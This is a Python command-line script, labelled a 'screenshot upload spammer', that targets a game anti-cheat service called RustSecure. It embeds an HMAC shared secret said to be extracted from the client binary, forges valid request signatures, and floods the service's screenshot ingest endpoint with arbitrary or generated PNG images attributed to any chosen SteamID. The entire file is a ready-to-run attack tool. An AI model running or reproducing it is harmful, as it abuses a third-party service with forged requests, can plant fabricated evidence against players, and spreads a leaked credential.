#!/usr/bin/env python3
"""
RustSecure screenshot upload spammer.

Generates valid HMAC-signed requests to flood /api/ingest/screenshot
with arbitrary PNG data for any SteamID.

Usage:
  python3 screenshot_spam.py <steamid> [--count N] [--image path.png]

The sharedSecret and HMAC scheme are extracted from the client binary.
"""

import argparse, base64, hashlib, hmac, time, sys, os, io

try:
    import requests
except ImportError:
    print("pip install requests")
    sys.exit(1)

# From decrypted loader strings [49]
SHARED_SECRET = "R260iT7ujsI58aTxAExVby6qea3L056h6SfnEr2BLKbmY2vlvm"
UPLOAD_URL = "https://rustsecure.ru/api/ingest/screenshot"


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def compute_signature(steam_id, request_id, issued, expires, reason, method):
    """Replica of ComputeScreenshotSignature from SynchronizeFrameUpdate."""
    payload = "|".join([steam_id, request_id, str(issued), str(expires), reason, method])
    sig = hmac.new(
        SHARED_SECRET.encode("utf-8"),
        payload.encode("utf-8"),
        hashlib.sha256
    ).digest()
    return b64url(sig)


def make_minimal_png(width=1920, height=1080, color=(0, 0, 0)):
    """Generate a minimal valid PNG (single-color)."""
    import struct, zlib

    def chunk(chunk_type, data):
        c = chunk_type + data
        return struct.pack(">I", len(data)) + c + struct.pack(">I", zlib.crc32(c) & 0xFFFFFFFF)

    header = b"\x89PNG\r\n\x1a\n"
    ihdr = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)  # 8-bit RGB
    # Single row: filter byte 0 + RGB pixels
    row = b"\x00" + bytes(color) * width
    raw = b"".join(row for _ in range(height))
    # Compress
    compressed = zlib.compress(raw, 1)

    return header + chunk(b"IHDR", ihdr) + chunk(b"IDAT", compressed) + chunk(b"IEND", b"")


def spam(steam_id, count=10, image_path=None, delay=0.1):
    if image_path and os.path.exists(image_path):
        png_data = open(image_path, "rb").read()
        print(f"Using image: {image_path} ({len(png_data)} bytes)")
    else:
        png_data = make_minimal_png(1920, 1080, (255, 0, 0))  # red screen
        print(f"Generated minimal PNG ({len(png_data)} bytes)")

    print(f"Target: {UPLOAD_URL}")
    print(f"SteamID: {steam_id}")
    print(f"Count: {count}")
    print()

    success = 0
    for i in range(count):
        request_id = f"spam-{i:06d}-{int(time.time())}"
        issued = int(time.time())
        expires = issued + 3600  # 1 hour validity
        reason = "manual_review"
        method = "dxgi"

        sig = compute_signature(steam_id, request_id, issued, expires, reason, method)

        url = f"{UPLOAD_URL}?method={method}&width=1920&height=1080&affinity=0"
        headers = {
            "X-RS-SteamId": steam_id,
            "X-RS-RequestId": request_id,
            "X-RS-RequestSig": sig,
            "Content-Type": "application/octet-stream",
        }

        try:
            resp = requests.put(url, data=png_data, headers=headers, timeout=10)
            status = resp.status_code
            if 200 <= status < 300:
                success += 1
                marker = "OK"
            else:
                marker = f"HTTP {status}"
            print(f"  [{i+1}/{count}] {marker} (req={request_id[:20]}...)")
        except requests.RequestException as e:
            print(f"  [{i+1}/{count}] ERR: {e}")

        if delay > 0 and i < count - 1:
            time.sleep(delay)

    print(f"\nDone: {success}/{count} uploaded")


def main():
    parser = argparse.ArgumentParser(description="RustSecure screenshot upload spammer")
    parser.add_argument("steamid", help="Target SteamID64")
    parser.add_argument("--count", type=int, default=10, help="Number of screenshots to upload (default: 10)")
    parser.add_argument("--image", help="Path to PNG image (default: generated red screen)")
    parser.add_argument("--delay", type=float, default=0.1, help="Delay between requests in seconds (default: 0.1)")
    args = parser.parse_args()

    spam(args.steamid, args.count, args.image, args.delay)


if __name__ == "__main__":
    main()
